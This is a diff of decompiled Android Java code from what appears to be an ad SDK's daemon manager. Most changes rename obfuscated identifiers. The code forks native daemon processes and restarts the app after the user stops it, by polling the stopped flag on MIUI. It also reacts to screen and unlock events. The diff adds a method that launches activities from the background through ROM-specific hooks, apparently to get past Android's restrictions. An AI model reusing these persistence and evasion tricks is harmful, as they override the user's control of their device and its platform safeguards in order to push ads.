@@ -2,10 +2,15 @@ package defpackage;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
+import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Process;
+
+import com.hm.ck.CkRomUtils;
 import com.vi.daemon.DaemonNative;
+import com.wolike.ads.AdsCallback;
 import com.wolike.ads.AdsHelper;
 import com.wolike.ads.AdsJobService;
 import com.wolike.ads.AdsLog;
@@ -13,40 +18,42 @@ import com.wolike.ads.AdsReceiver;
 import com.wolike.ads.ProcessHolder;
 import com.wolike.ads.screenmonitor.ScreenMonitorHelper;
 import com.wolike.ads.utils.RomUtil;
-import defpackage.ok;
+import com.wolike.start.ActivityUtils;
+
 import java.io.File;
 
-/* loaded from: classes.dex */
+import mc.zcoszprmcis.kabwotl.mcrz;
+
 public class lk {
-    public kk a;
-    public Context b;
-    public mk c;
-    public ok.Ll1lLl1l1LL1l1Ll d;
+    public LogConfiguration logConfiguration;
+    public Context context;
+    public CommonCallback commonCallback;
+    public ok.screenMonitor screenMonitor;
 
     /* loaded from: classes.dex */
-    public static final class L1L1L1Ll1l1L1l1l11L {
+    public static final class LkHolder {
         @SuppressLint({"StaticFieldLeak"})
-        public static lk f3977Ll1lLl1l1LL1l1Ll = new lk(null);
+        public static lk INSTANCE = new lk(null);
     }
 
     /* loaded from: classes.dex */
-    public class Ll1lLl1l1LL1l1Ll implements Runnable {
-        public Ll1lLl1l1LL1l1Ll() {
+    public class ForkChildRunnable implements Runnable {
+        public ForkChildRunnable() {
         }
 
         @Override // java.lang.Runnable
         public void run() {
             lk lkVar = lk.this;
-            lkVar.a(lkVar.b);
+            lkVar.forkChild(lkVar.context);
         }
     }
 
     /* loaded from: classes.dex */
-    public class l1L1L1L1L1l1LLL1LL1ll implements Runnable {
+    public class PackageMonitorRunnable implements Runnable {
 
         /* loaded from: classes.dex */
-        public class Ll1lLl1l1LL1l1Ll implements Runnable {
-            public Ll1lLl1l1LL1l1Ll(l1L1L1L1L1l1LLL1LL1ll l1l1l1l1l1l1lll1ll1ll) {
+        public class restartRunnable implements Runnable {
+            public restartRunnable(PackageMonitorRunnable packageMonitorRunnable) {
             }
 
             @Override // java.lang.Runnable
@@ -55,7 +62,7 @@ public class lk {
             }
         }
 
-        public l1L1L1L1L1l1LLL1LL1ll() {
+        public PackageMonitorRunnable() {
         }
 
         @Override // java.lang.Runnable
@@ -64,10 +71,10 @@ public class lk {
             AdsLog.d("startPackageMonitor");
             while (true) {
                 try {
-                    if ((lk.this.b.getPackageManager().getApplicationInfo(lk.this.b.getPackageName(), 128).flags & 2097152) != 0) {
+                    if ((lk.this.context.getPackageManager().getApplicationInfo(lk.this.context.getPackageName(), PackageManager.GET_META_DATA).flags & 2097152) != 0) {
                         DaemonNative.restartProcess();
                         for (int i2 = 0; i2 < 3; i2++) {
-                            new Thread(new Ll1lLl1l1LL1l1Ll(this)).start();
+                            new Thread(new restartRunnable(this)).start();
                         }
                     }
                 } catch (Throwable th) {
@@ -78,18 +85,18 @@ public class lk {
     }
 
     /* loaded from: classes.dex */
-    public class l1l1l1l1LL1L1l1lL1l implements ok.Ll1lLl1l1LL1l1Ll {
-        public l1l1l1l1LL1L1l1lL1l() {
+    public class ScreenMonitorImpl implements ok.screenMonitor {
+        public ScreenMonitorImpl() {
         }
 
-        @Override // defpackage.ok.Ll1lLl1l1LL1l1Ll
+        @Override  
         public void onScreenMonitorTimer(boolean z) {
         }
 
-        @Override // defpackage.ok.Ll1lLl1l1LL1l1Ll
+        @Override  
         public void onScreenStatusChanged(boolean z) {
             if (!RomUtil.isOppo() || z) {
-                lk.this.a();
+                lk.this.forkChild();
             }
         }
     }
@@ -104,78 +111,78 @@ public class lk {
         }
     }
 
-    public lk(Ll1lLl1l1LL1l1Ll ll1lLl1l1LL1l1Ll) {
+    public lk(ForkChildRunnable forkChildRunnable) {
         this();
     }
 
-    /* JADX INFO: Access modifiers changed from: private */
-    public void a() {
+     public void forkChild() {
         new Thread(new lilil1liLi1lLL1l1l(this)).start();
     }
 
-    private void b() {
-        for (String str : AdsHelper.getIndicatorFiles(this.b)) {
+    private void deleteIndicatorFile() {
+        for (String str : AdsHelper.getIndicatorFiles(this.context)) {
             if (str != null && new File(str).delete()) {
                 AdsLog.d("delete indicatorFile success,file=" + str);
             }
         }
     }
 
-    private void c() {
+    private void registerBroadcast() {
         IntentFilter intentFilter = new IntentFilter();
         intentFilter.addAction("android.intent.action.SCREEN_ON");
         intentFilter.addAction("android.intent.action.SCREEN_OFF");
         intentFilter.addAction("android.intent.action.CLOSE_SYSTEM_DIALOGS");
         intentFilter.addAction("android.intent.action.USER_PRESENT");
         intentFilter.addAction("android.intent.action.ACTION_SHUTDOWN");
-        this.b.registerReceiver(new AdsReceiver(), intentFilter);
+        this.context.registerReceiver(new AdsReceiver(), intentFilter);
+        AdsLog.d("register broadcast");
     }
 
-    private boolean d() {
+    private boolean checkIsMiui() {
         return RomUtil.isMiui() && Build.VERSION.SDK_INT < 29;
     }
 
-    private void e() {
-        if (d()) {
-            new Thread(new l1L1L1L1L1l1LLL1LL1ll()).start();
+    private void startPackageMonitor() {
+        if (checkIsMiui()) {
+            new Thread(new PackageMonitorRunnable()).start();
         }
     }
 
     public static lk getInstance() {
-        return L1L1L1Ll1l1L1l1l11L.f3977Ll1lLl1l1LL1l1Ll;
+        return LkHolder.INSTANCE;
     }
 
-    public mk getCallback() {
-        return this.c;
+    public CommonCallback getCallback() {
+        return this.commonCallback;
     }
 
-    public kk getConfig() {
-        return this.a;
+    public LogConfiguration getConfig() {
+        return this.logConfiguration;
     }
 
     public Context getContext() {
-        return this.b;
+        return this.context;
     }
 
-    public void init(Context context, kk kkVar, mk mkVar) {
-        this.b = context;
-        this.a = kkVar;
-        this.c = mkVar;
+    public void init(Context context, LogConfiguration logConfigurationVar, AdsCallback commonCallbackVar) {
+        this.context = context;
+        this.logConfiguration = logConfigurationVar;
+        this.commonCallback = commonCallbackVar;
         AdsLog.d("SyncManager DaemonManager init");
         ProcessHolder.init(context);
         AdsHelper.init(context);
         if (ProcessHolder.IS_MAIN) {
-            b();
+            deleteIndicatorFile();
         }
-        if (ProcessHolder.IS_MAIN || ProcessHolder.IS_DAEMON) {
-            c();
-            e();
-            new Thread(new Ll1lLl1l1LL1l1Ll()).start();
+        if (ProcessHolder.isMainProcess(context) || ProcessHolder.IS_DAEMON) {
+            registerBroadcast();
+            startPackageMonitor();
+            new Thread(new ForkChildRunnable()).start();
         }
         AdsHelper.startServices(context);
-        if ((ProcessHolder.IS_MAIN || ProcessHolder.IS_SERVICE) && this.a.isScreenMonitorEnable()) {
-            if (ProcessHolder.IS_MAIN) {
-                ok.getInstance().addCallback(this.d);
+        if ((ProcessHolder.isMainProcess(context) || ProcessHolder.IS_SERVICE) && this.logConfiguration.isScreenMonitorEnable()) {
+            if (ProcessHolder.isMainProcess(context)) {
+                ok.getInstance().addCallback(this.screenMonitor);
             } else {
                 ok.setQueryInterval(1000);
             }
@@ -185,11 +192,11 @@ public class lk {
     }
 
     public lk() {
-        this.d = new l1l1l1l1LL1L1l1lL1l();
+        this.screenMonitor = new ScreenMonitorImpl();
     }
 
     /* JADX INFO: Access modifiers changed from: private */
-    public void a(Context context) {
+    public void forkChild(Context context) {
         AdsLog.d("forkChild,context=" + context);
         String forkName = AdsHelper.getForkName();
         String selfForkLockFile = AdsHelper.getSelfForkLockFile(context);
@@ -204,5 +211,20 @@ public class lk {
         AdsLog.d("forkChild,forkWaitIndicatorFile=" + selfForkWaitIndicatorFile);
         AdsLog.d("===============forkChild log end==============");
         DaemonNative.forkChild(forkName, selfForkLockFile, selfForkWaitFile, selfForkIndicatorFile, selfForkWaitIndicatorFile);
+    }
+
+
+    public static void startActivity(Context context, Intent intent){
+        if (ActivityUtils.isAppRunningForeground(context)){
+            context.startActivity(intent);
+            return;
+        }
+        int currentROM2 = CkRomUtils.getCurrentROM();
+        if (currentROM2 == 4 ) {
+            mcrz.a(context, intent);
+        }else{
+            ActivityUtils.hookJumpActivity(context,intent);
+        }
+
     }
 }
